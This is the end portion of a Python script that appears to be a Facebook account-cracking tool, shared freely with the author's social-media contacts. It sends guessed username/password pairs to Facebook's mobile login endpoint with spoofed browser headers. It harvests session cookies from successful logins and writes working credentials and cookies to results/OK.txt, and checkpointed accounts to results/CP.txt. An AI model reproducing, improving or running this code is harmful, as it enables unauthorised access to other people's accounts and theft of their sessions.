                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                    "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1)
                
                 }
                 head = {
                    "Host": "m.facebook.com",
                    "content-length": f"{str(len(data))}",
                    "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                    "user-agent": ua,
                    "content-type": "application/x-www-form-urlencoded",
                    "accept": "*/*",
                    "origin": "https://m.facebook.com",
                    "x-requested-with": "mark.via.gp",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.facebook.com/login/?ref=dbl&fl&login_from_aymh=1",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }
                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data = data, headers = head, allow_redirects=False)
                 if 'c_user' in ses.cookies.get_dict():
                     ok.append(user)
                     coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
                     tree = Tree(f"{P2}LIVE {H2}{days} {reall} {year}")
                     tree.add(Panel.fit(f"{H2}{user}|{pw}",style=f"#AAAAAA")).add(Panel.fit(f"{H2}{coki} | {ua}",style=f"#AAAAAA"))
                     prints(tree)
                     open('results/OK.txt','a').write(f"{user}|{pw}|{coki}\n")
                     break
                 elif 'checkpoint' in ses.cookies.get_dict():
                     cp.append(user)
                     tree = Tree(f"{P2}CHEK {K2}{days} {reall} {year}")
                     tree.add(Panel.fit(f"{K2}{user}|{pw}",style=f"#AAAAAA")).add(Panel.fit(f"{K2}{ua}",style=f"#AAAAAA"))
                     prints(tree)
                     open('results/CP.txt','a').write(f"{user}|{pw}\n")
                     break
                 else:
                     continue
             except requests.exceptions.ConnectionError:
                 time.sleep(15)
        loop +=1

if __name__ == '__main__':
   try:os.system("git pull")
   except:pass
   try:os.mkdir("results")
   except:pass
   try:os.mkdir("data")
   except:pass
   MulaiTools()

##--------------[ SCRIPT FREE JANGAN DI JUAL BELIKAN! ]--------------##

# Github    : https://github.com/Xyaa-Code
# Facebook : www.facebook.com/Aditya.putraXD991
# WhatsApp : https://wa.me/+16143244921
# Instagram : @xyaacode